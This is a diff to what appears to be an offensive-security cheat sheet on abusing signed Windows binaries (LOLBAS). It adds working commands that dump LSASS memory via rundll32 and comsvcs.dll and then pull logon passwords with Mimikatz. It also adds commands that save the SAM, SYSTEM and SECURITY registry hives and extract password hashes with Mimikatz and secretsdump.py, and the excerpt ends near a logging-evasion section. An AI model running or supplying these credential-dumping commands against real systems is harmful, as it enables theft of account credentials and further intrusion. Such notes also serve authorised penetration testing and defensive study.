@@ -201,12 +201,23 @@ ls C:\Windows\system32\CodeIntegrity
 ### LOLBAS
 - Use Microsoft Signed Binaries to exploit https://lolbas-project.github.io/
 
-#### For example dumping lsass:
+#### rundll32.exe and comsvcs.dll dumping lsass:
 ```
 Get-Process | Select-String lsass
 rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 708 C:\Users\Public\lsass.dmp full
 dir C:\Users\Public\lsass.dmp
+
 Invoke-Mimikatz -Command '"sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords"'
+```
+
+#### Rex.exe dumping sam
+```
+reg save HKLM\SECURITY security.bak
+reg save HKLM\SYSTEM system.bak
+reg save HKLM\SAM sam.bak
+
+Invoke-Mimikatz -Command '"lsadump::sam system.bak sam.bak"'
+secretsdump.py -sam sam.bak -security security.bak -system system.bak local
 ```
 
 ### Logging evasion
